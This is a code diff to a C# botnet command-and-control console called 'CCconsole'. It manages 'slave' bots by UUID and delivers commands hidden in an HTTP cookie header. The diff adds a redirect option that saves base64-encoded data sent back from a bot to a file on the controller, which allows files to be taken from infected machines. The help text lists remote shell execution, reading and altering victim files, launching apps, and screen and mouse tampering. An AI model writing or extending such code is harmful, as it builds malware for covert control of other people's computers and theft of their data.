@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections;
+using System.IO;
 using System.Net;
 using System.Threading;
 
@@ -9,18 +10,22 @@ namespace CCconsole
     {
         public const int expireTime = 10000;
 
-        public string UUID; //= Guid.NewGuid().ToString()
+        public DateTime lastping;
+        public DateTime lastoutput;
+        public string UUID;         // stations's name
+        public string redirectFile; // where to redirect next
+        string buff;                // returned data
+
         Queue cmdlist;
-        DateTime lastping;
-        DateTime lastoutput;
-        string buff;
 
         public Slave(string uuid)
         {
-            cmdlist = new Queue();
+            lastoutput = DateTime.Now;
             UUID = uuid;
             buff = string.Empty;
-            lastoutput = DateTime.Now;
+            redirectFile = null;
+
+            cmdlist = new Queue();
         }
 
         public void update(string response)
@@ -31,6 +36,8 @@ namespace CCconsole
 
         public string getResponses()
         {
+            lastoutput = DateTime.Now;
+
             string tmp = buff;
             buff = string.Empty;
             return tmp;
@@ -159,8 +166,19 @@ namespace CCconsole
                 response.AppendHeader("cookie", "");
             }
             else
-            {   // send command from buffer
-                response.AppendHeader("cookie", slave.getcmd());
+            {   
+                string cmd = slave.getcmd();
+
+                if (cmd.Contains(">"))
+                {   // if redirect
+                    string[] elements = cmd.Split(new Char[] { '>' });
+                    slave.redirectFile = elements[1];
+                    response.AppendHeader("cookie", elements[0]);
+                }
+                else
+                {   // send command from buffer
+                    response.AppendHeader("cookie", cmd);
+                }
             }
         }
 
@@ -174,7 +192,21 @@ namespace CCconsole
             {
                 using (System.IO.StreamReader reader = new System.IO.StreamReader(body, request.ContentEncoding))
                 {
-                    slave.update(reader.ReadToEnd());
+                    // write to stdout
+                    if (slave.redirectFile == null)
+                    {
+                        var base64EncodedBytes = System.Convert.FromBase64String(reader.ReadToEnd());
+                        slave.update(System.Text.Encoding.UTF8.GetString(base64EncodedBytes));
+                    }
+                    // write to file
+                    else
+                        using (FileStream fs2 = new FileStream(slave.redirectFile, FileMode.Create))
+                        using (BinaryWriter bw = new BinaryWriter(fs2))
+                        {
+                            byte[] data = Convert.FromBase64String(reader.ReadToEnd());
+                            bw.Write(data);
+                            slave.redirectFile = null;
+                        }
                 }
             }
         }
@@ -268,7 +300,11 @@ namespace CCconsole
 
                     case "output":
                         if (crtSlave != null)
+                        {
+                            Console.WriteLine("Output from " + crtSlave.lastoutput.ToLongTimeString() + 
+                                                " to " + DateTime.Now.ToLongTimeString());
                             Console.Out.WriteLine(crtSlave.getResponses());
+                        }
                         else
                             Console.Write("not bot selected");
                         break;
@@ -300,8 +336,8 @@ namespace CCconsole
                                             "\n" +
                                             "BOT ACTIONS:\n"+
                                             "cmd <cmd command> - runs a shell command\n" +
-                                            "read <file> - prints the contents of a file\n" +
-                                            "update <file> <text> - appends text to the end of the file\n" +
+                                            "read <bot file> - prints the contents of a file\n" +
+                                            "update <bot file> <text> - appends text to the end of the file\n" +
                                             "run <app> - runs an app (eg. chrome)\n" +
                                             "rotate {0, 90, 180, 270} - rotate bot's screen\n" +
                                             "invert {0,1} - invert bot's mouse movement\n" +
